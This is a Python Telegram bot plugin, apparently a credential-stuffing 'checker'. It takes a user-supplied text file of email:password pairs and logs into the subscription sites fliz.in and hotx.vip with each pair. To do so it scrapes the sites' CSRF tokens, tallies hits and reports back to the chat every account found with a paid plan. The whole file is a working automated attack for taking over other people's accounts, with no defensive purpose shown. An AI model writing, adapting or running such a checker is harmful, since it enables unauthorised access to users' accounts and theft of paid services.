import time
from pyrogram import Client
import requests
from requests.exceptions import ProxyError
import re
# import bs4
from pyrogram import Client, filters
import json

def find_between( s, first, last ):
    try:
        start = s.index( first ) + len( first )
        end = s.index( last, start )
        return s[start:end]
    except ValueError:
        return ""

def count_lines(filename):
    with open(filename, 'r') as f:
        return len(f.readlines())

@Client.on_message(filters.command(["hot", "make"], prefixes=[".", "/", "!"], case_sensitive=False) & filters.text)
async def gen(Client , message):
    try:
        if message.reply_to_message:
            if message.reply_to_message.document:
                if message.reply_to_message.document.file_name.endswith(".txt"):
                    await message.reply_to_message.download("accounts.txt")
                    time.sleep(1)
                    msg = await message.reply_text("Downloading file...")
                    with open("downloads/accounts.txt", "r") as f:
                        le = count_lines("downloads/accounts.txt")
                        flizhits = 0
                        flizfails = 0
                        hothits = 0
                        hotfails = 0
                        for i, line in enumerate(f, start=1):
                            if not line.strip():
                                break
                            else:
                                email,password = line.split(":")
                                password = password.strip()
                                email = email.strip()
                                r = requests.session()
                                a = r.get("https://fliz.in/login")
                                token = find_between(a.text, 'name="_token" type="hidden" value="', '"')
                                data = {
                                "_token": token,
                                "email": email,
                                "password": password
                                }
                                b = r.post("https://fliz.in/login", data=data)
                                print(email+":"+password)
                                if "The email or the password is invalid. Please try again." in b.text:
                                            flizfails += 1
                                            fliz = "FALSE"
                                elif "Logout" in b.text:
                                    if "Current Plan" in b.text:
                                        flizhits += 1
                                        fliz = "TRUE"
                                    else:
                                        fliz = "Free"

                                c = r.get('https://hotx.vip/login')
                                token = find_between(c.text, 'name="_token" value="', '"')
                                data = {
                                "_token": token,
                                "email": email,
                                "password": password
                                }
                                d = r.post('https://hotx.vip/login', data=data)
                                if "These credentials do not match our records." in d.text:
                                    hotfails += 1
                                    hot = "FALSE"
                                elif "Logout" in d.text:
                                    if "Current Plan" in d.text:
                                        hothits += 1
                                        hot = "TRUE"
                                    else:
                                        hot = "FREE"
                                await msg.edit_text(f"Fliz Hits:{flizhits} Fliz Fails:{flizfails} Hot Hits:{hothits} Hot Fails:{hotfails} Total Accounts:{le}</b>") 
                                if(fliz == "TRUE" and hot == "TRUE"):
                                    await message.reply_text("Email: "+email+" Password: "+password+" \nFliz: "+fliz+" \nHot: "+hot)
                                elif(fliz == "TRUE" and hot == "FALSE"):
                                    await message.reply_text("Email: "+email+" Password: "+password+" \nFliz: "+fliz+" \nHot: "+hot)
                                elif(fliz == "FALSE" and hot == "TRUE"):
                                    await message.reply_text("Email: "+email+" Password: "+password+" \nFliz: "+fliz+" \nHot: "+hot)
                                elif(fliz == "FALSE" and hot == "FALSE"):
                                    print("Invalid Account")



                    await message.reply_text("Done")
                    f.close()
                else:
                    await message.reply_text("Please reply to a .txt file")

                    
    except Exception as e:
        print(e)
